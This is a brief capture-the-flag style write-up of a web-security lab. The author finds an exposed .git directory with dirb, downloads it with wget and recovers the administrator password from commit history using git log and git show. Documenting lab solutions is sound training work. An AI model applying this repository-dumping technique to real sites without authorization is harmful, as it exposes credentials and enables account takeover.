Title: Information disclosure in version control history
Level: Beginner
Desc: This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos. 

I found, that the app use .git directory by scanning it by dirb.
![image](https://github.com/user-attachments/assets/f67a2e81-dc10-4c8c-8561-647212f6110e)


![image](https://github.com/user-attachments/assets/003d6fc1-7628-49e5-8ae6-a536ed408912)

I downloaded files from .git directory and then I check command "git show" to check informations about last commit.

```
 2052  sudo wget -r  https://0a6e00430411708380b2cbd8005a00b2.web-security-academy.net/.git/
 2054  cd 0a6e00430411708380b2cbd8005a00b2.web-security-academy.net
 2066  sudo git reset --hard
 2068  sudo git log
 2070  sudo git show
```


![image](https://github.com/user-attachments/assets/e8c446d9-99af-4029-bf70-0bf45ab7597b)



